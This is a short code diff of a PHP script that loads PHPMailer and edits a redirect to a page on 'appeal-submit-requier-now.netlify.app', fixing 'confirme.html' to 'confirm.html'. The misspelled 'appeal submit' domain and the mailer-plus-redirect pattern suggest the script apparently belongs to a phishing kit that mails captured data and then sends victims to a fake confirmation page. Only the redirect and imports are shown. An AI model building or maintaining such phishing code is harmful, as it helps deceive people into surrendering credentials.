@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://appeal-submit-requier-now.netlify.app/confirme.html");
+header("Location:https://appeal-submit-requier-now.netlify.app/confirm.html");
 
 require 'Exception.php';
 require 'PHPMailer.php';
